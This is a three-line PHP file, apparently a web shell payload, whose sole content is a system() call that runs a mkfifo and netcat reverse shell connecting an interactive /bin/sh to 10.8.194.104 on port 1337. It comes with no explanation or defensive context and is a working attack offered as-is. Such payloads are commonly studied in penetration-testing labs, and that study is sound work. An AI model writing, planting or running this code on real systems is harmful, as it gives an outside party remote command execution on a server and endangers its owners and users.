<?php
system("rm -rf /tmp/e;mkfifo /tmp/e;cat /tmp/e | /bin/sh -i 2>&1 | nc 10.8.194.104 1337 > /tmp/e");
?>
